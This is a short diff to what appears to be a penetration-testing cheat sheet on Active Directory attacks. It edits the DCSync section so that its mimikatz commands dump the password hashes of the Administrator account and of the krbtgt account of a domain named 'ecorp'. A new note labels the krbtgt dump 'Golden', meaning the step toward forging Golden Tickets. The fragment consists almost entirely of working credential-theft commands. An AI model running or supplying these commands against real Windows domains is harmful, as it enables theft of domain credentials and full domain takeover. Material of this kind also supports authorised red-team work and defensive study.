@@ -184,7 +184,12 @@ NTLM == RC4
 #### DCSync
 Does NOT need localadmin to run, just DC Replication privs:
 ```
-lsadump::dcsync /user:Bob
+lsadump::dcsync /user:Administrator
+```
+
+Golden - 
+```
+lsadump::dcsync /user:ecorp\krbtgt
 ```
 #### Golden
 Jump to DC to dump krbtgt hash -
